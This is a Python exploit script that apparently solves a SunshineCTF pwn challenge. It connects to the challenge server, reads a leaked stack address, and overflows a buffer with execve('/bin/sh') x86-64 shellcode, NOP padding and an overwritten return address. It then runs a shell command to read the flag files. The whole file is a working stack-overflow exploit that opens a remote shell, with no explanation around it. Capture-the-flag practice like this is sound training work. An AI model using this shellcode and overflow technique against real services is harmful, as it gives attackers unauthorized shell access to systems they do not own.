import socket
import struct
import sys
import time


HOST = sys.argv[1] if len(sys.argv) > 1 else "chal.sunshinectf.org"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 26003


def recvn(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise EOFError(f"wanted {n} bytes, got {len(data)}")
        data += chunk
    return data


shellcode = (
    b"\x48\x31\xf6"                                  # xor rsi, rsi
    b"\x56"                                          # push rsi
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"      # mov rdi, '//bin/sh'
    b"\x57"                                          # push rdi
    b"\x48\x89\xe7"                                  # mov rdi, rsp
    b"\x48\x31\xd2"                                  # xor rdx, rdx
    b"\x48\x31\xc0"                                  # xor rax, rax
    b"\xb0\x3b"                                      # mov al, 59
    b"\x0f\x05"                                      # syscall
)


with socket.create_connection((HOST, PORT), timeout=10) as s:
    leaked_rsp_minus_8 = struct.unpack("<Q", recvn(s, 8))[0]
    second_read_buffer = leaked_rsp_minus_8 + 8 - 0x88
    print(f"leak = {leaked_rsp_minus_8:#x}")
    print(f"ret  = {second_read_buffer:#x}")

    s.sendall(b"A" * 0x18)
    payload = shellcode + b"\x90" * (0x80 - len(shellcode))
    payload += struct.pack("<Q", second_read_buffer)
    s.sendall(payload)

    time.sleep(0.2)
    s.sendall(b"cat flag* /flag* 2>/dev/null; exit\n")
    s.settimeout(2)

    out = b""
    while True:
        try:
            chunk = s.recv(4096)
        except TimeoutError:
            break
        if not chunk:
            break
        out += chunk

print(out.decode("latin1", errors="replace"))
